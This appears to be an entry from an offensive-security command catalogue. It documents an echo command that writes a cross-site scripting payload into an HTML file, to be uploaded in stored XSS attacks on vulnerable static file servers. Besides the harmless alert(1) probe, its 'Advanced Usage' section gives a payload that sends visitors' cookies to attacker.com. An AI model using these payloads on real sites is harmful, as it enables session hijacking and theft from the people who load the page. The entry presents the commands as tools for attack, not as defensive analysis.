---
data: echo "<script>alert(1);</script>" > ex.html
tags:
  - xss
  - file-creation
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 15032e10-1477-4896-ac2c-8a301688f892
created_at: '2025-12-14T03:15:10.402Z'
updated_at: '2025-12-14T03:15:10.402Z'
verified: false
validated: true
submitted: true
---
# echo-create-malicious-html

## Command

```bash
echo "<script>alert(1);</script>" > ex.html
```

## Description

This command creates a simple HTML file containing a basic XSS payload script tag that alerts '1' when executed in a browser. Used to prepare files for upload in stored XSS attacks against vulnerable static file servers like tianma-static.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> ex.html` | Redirects the echo output to create the file `ex.html` | Yes |
| `"<script>alert(1);</script>"` | The XSS payload as a string to write to the file | Yes |

## Examples

### Basic Usage

```bash
echo "<script>alert(1);</script>" > ex.html
```

### Advanced Usage

To create a more complex payload:

```bash
echo "<script>document.location='http://attacker.com?cookie='+document.cookie;</script>" > steal.html
```

## Expected Output

No stdout output; creates `ex.html` file. Verify with `ls ex.html` or `cat ex.html` to see the content.

## Related

- [[Related Procedure: Stored-XSS-via-Malicious-HTML-Upload]]
